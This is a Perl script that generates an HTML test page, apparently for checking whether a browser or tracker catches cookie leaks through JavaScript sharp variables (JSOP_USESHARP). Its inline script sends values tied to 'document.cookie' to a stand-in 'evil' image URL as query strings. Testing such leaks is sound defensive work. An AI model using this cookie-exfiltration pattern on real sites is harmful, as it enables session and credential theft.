#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_USESHARP";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		
		var notevil = #1 = [1, 2, #1#];
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val 

		var notevil2 = 1;
		if ($evil) {
			notevil2 = #1 = [1, 2, #1#];
		}
		var url2 = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url2;
		
		// normal usage 

		var notevil3 = #1 = [1, evil, #1#];
		var url3 = "$imgevilurl?isevil=" + notevil3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
